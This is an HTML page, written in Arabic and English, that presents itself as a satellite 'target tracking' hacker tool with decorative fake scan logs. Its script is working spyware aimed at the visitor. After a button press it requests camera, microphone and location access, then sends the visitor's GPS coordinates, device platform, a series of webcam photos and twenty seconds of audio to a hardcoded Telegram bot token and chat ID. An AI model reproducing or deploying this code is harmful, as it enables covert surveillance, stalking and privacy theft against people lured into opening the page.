<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKER EL-NAGM | LIVE DATA EXTRACTION</title>
    <style>
        :root { --green: #00ff41; --red: #ff0000; }
        body, html { margin: 0; background: #000; color: var(--green); font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; }
        .container { display: grid; grid-template-columns: 300px 1fr 300px; grid-template-rows: 60px 1fr 180px; height: 100vh; gap: 8px; padding: 8px; box-sizing: border-box; }
        .panel { border: 1px solid var(--green); background: rgba(0, 15, 0, 0.9); padding: 10px; position: relative; }
        .header { grid-column: 1 / 4; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--green); }
        .critical { color: var(--red); font-weight: bold; animation: pulse 0.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        button { background: var(--green); color: #000; font-weight: bold; padding: 15px; border: none; cursor: pointer; width: 100%; font-size: 18px; }
        input { background: #000; border: 1px solid var(--green); color: var(--green); padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        /* رادار التمويه */
        .radar { width: 150px; height: 150px; border: 2px solid var(--green); border-radius: 50%; margin: 20px auto; position: relative; overflow: hidden; }
        .radar:after { content: ""; position: absolute; top: 50%; left: 50%; width: 500px; height: 500px; background: rgba(0, 255, 65, 0.1); transform-origin: top left; animation: rotate 4s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="panel header">
        <h2 style="margin:0;">EL-NAGM SATELLITE PRO</h2>
        <div id="sys-status" class="critical">STATUS: WAITING_FOR_LINK</div>
    </div>

    <div class="panel">
        <h4 style="border-bottom:1px solid var(--green);">HARDWARE_SCAN</h4>
        <div id="logs" style="font-size:10px;"></div>
    </div>

    <div class="panel" style="text-align:center;">
        <div class="radar"></div>
        <p>جاري فحص الترددات...</p>
        <div id="video-preview" style="display:none; width:100px; height:100px; border:1px solid red; margin:auto;">
            <video id="v" autoplay playsinline muted style="width:100%; height:100%; object-fit: cover;"></video>
        </div>
    </div>

    <div class="panel">
        <h4 style="border-bottom:1px solid var(--green);">INTEL_REPORT</h4>
        <div id="intel" style="font-size:10px;"></div>
    </div>

    <div class="panel" style="grid-column: 1 / 4;">
        <input type="text" id="t-num" placeholder="رقم الهدف المراد تعقبه...">
        <button onclick="igniteCapture()">إطلاق عملية السحب الشامل</button>
    </div>
</div>

<canvas id="c" style="display:none;"></canvas>

<script>
    const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
    const chatId = "8754338811";

    async function push(data, isFile = false, type = "photo") {
        const url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : 'sendAudio') : 'sendMessage'}`;
        const fd = new FormData();
        fd.append('chat_id', chatId);
        if (isFile) fd.append(type === 'photo' ? 'photo' : 'audio', data, 'capture.jpg');
        else { fd.append('text', data); fd.append('parse_mode', 'Markdown'); }
        try { await fetch(url, { method: 'POST', body: fd }); } catch(e){}
    }

    async function igniteCapture() {
        const target = document.getElementById('t-num').value;
        if(!target) return alert("حدد الهدف!");
        
        document.getElementById('sys-status').innerText = "STATUS: BYPASSING_SECURITY...";

        try {
            // 1. طلب الوصول الحي للكاميرا والميكروفون
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 }, 
                audio: true 
            });

            // ربط البث بالفيديو المخفي عشان يلقط صور حقيقية
            const video = document.getElementById('v');
            video.srcObject = stream;

            // 2. إرسال تقرير البداية
            push(`🚀 *تم بدء السحب الحي للهدف:* ${target}\n📱 الجهاز: ${navigator.platform}`);

            // 3. سحب الموقع
            navigator.geolocation.getCurrentPosition(p => {
                push(`📍 موقع الهدف: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // 4. محرك سحب الصور الحقيقية (19 صورة)
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            canvas.width = 640;
            canvas.height = 480;

            let count = 0;
            const captureLoop = setInterval(() => {
                if(count >= 19) {
                    clearInterval(captureLoop);
                    return;
                }
                // رسم الفريم الحالي من الكاميرا الحية على الكانفاس
                ctx.drawImage(video, 0, 0, 640, 480);
                // تحويلها لصورة حقيقية وإرسالها
                canvas.toBlob(blob => push(blob, true, "photo"), 'image/jpeg', 0.8);
                count++;
            }, 1500);

            // 5. تسجيل صوت حي (20 ثانية)
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
                push(audioBlob, true, "audio");
                document.getElementById('sys-status').innerText = "STATUS: MISSION_SUCCESS";
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 20000);

        } catch (err) {
            alert("خطأ أمني: التطبيق يحتاج صلاحيات الكاميرا والموقع للتعقب!");
        }
    }

    // واجهة بيانات وهمية
    setInterval(() => {
        document.getElementById('logs').innerHTML = `> SCANNING_IP: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.x.x <br>` + document.getElementById('logs').innerHTML.substring(0,100);
        document.getElementById('intel').innerHTML = `> FOUND_NODE: 0x${Math.random().toString(16).slice(2,6)} <br>` + document.getElementById('intel').innerHTML.substring(0,100);
    }, 1000);
</script>

</body>
</html>
